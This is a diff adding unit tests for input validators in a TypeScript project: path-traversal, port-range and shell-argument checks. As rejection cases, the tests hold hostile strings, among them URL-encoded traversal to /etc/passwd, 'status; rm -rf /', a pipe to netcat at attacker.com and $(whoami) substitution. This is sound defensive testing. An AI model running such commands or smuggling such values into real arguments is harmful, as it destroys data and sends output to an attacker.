@@ -8,6 +8,8 @@ import { describe, expect, test } from "bun:test";
 import {
   SafeText,
   SafePath,
+  SafePort,
+  SafePassthroughArg,
   ContentText,
   QueryInput,
   CheckInput,
@@ -68,6 +70,16 @@ describe("SafePath - Path Traversal Prevention", () => {
     expect(result.success).toBe(false);
   });
 
+  test("rejects URL-encoded path traversal (%2e%2e)", () => {
+    const result = SafePath.safeParse("%2e%2e/%2e%2e/etc/passwd");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects mixed URL-encoded path traversal", () => {
+    const result = SafePath.safeParse("foo/%2e%2e/%2e%2e/etc/passwd");
+    expect(result.success).toBe(false);
+  });
+
   test("rejects shell metacharacters in paths", () => {
     const result = SafePath.safeParse("path/$(whoami)/file");
     expect(result.success).toBe(false);
@@ -81,6 +93,108 @@ describe("SafePath - Path Traversal Prevention", () => {
   test("accepts absolute paths", () => {
     const result = SafePath.safeParse("/opt/muninn/src/index.ts");
     expect(result.success).toBe(true);
+  });
+});
+
+describe("SafePort - Port Number Validation", () => {
+  test("accepts valid port 1", () => {
+    const result = SafePort.safeParse(1);
+    expect(result.success).toBe(true);
+    expect(result.success && result.data).toBe(1);
+  });
+
+  test("accepts valid port 65535", () => {
+    const result = SafePort.safeParse(65535);
+    expect(result.success).toBe(true);
+    expect(result.success && result.data).toBe(65535);
+  });
+
+  test("accepts common port 3333", () => {
+    const result = SafePort.safeParse(3333);
+    expect(result.success).toBe(true);
+  });
+
+  test("coerces string to number", () => {
+    const result = SafePort.safeParse("8080");
+    expect(result.success).toBe(true);
+    expect(result.success && result.data).toBe(8080);
+  });
+
+  test("rejects port 0", () => {
+    const result = SafePort.safeParse(0);
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects port 65536", () => {
+    const result = SafePort.safeParse(65536);
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects negative port", () => {
+    const result = SafePort.safeParse(-1);
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects NaN", () => {
+    const result = SafePort.safeParse("abc");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects float", () => {
+    const result = SafePort.safeParse(3333.5);
+    expect(result.success).toBe(false);
+  });
+});
+
+describe("SafePassthroughArg - Argument Validation", () => {
+  test("accepts normal argument", () => {
+    const result = SafePassthroughArg.safeParse("status");
+    expect(result.success).toBe(true);
+  });
+
+  test("accepts argument with spaces", () => {
+    const result = SafePassthroughArg.safeParse("some text with spaces");
+    expect(result.success).toBe(true);
+  });
+
+  test("accepts argument with hyphens and underscores", () => {
+    const result = SafePassthroughArg.safeParse("--some-flag_value");
+    expect(result.success).toBe(true);
+  });
+
+  test("accepts numeric argument", () => {
+    const result = SafePassthroughArg.safeParse("12345");
+    expect(result.success).toBe(true);
+  });
+
+  test("rejects semicolon (command chaining)", () => {
+    const result = SafePassthroughArg.safeParse("status; rm -rf /");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects pipe", () => {
+    const result = SafePassthroughArg.safeParse("status | nc attacker.com");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects ampersand", () => {
+    const result = SafePassthroughArg.safeParse("status && whoami");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects backtick", () => {
+    const result = SafePassthroughArg.safeParse("`whoami`");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects command substitution", () => {
+    const result = SafePassthroughArg.safeParse("$(whoami)");
+    expect(result.success).toBe(false);
+  });
+
+  test("rejects argument over 500 chars", () => {
+    const result = SafePassthroughArg.safeParse("a".repeat(501));
+    expect(result.success).toBe(false);
   });
 });
 
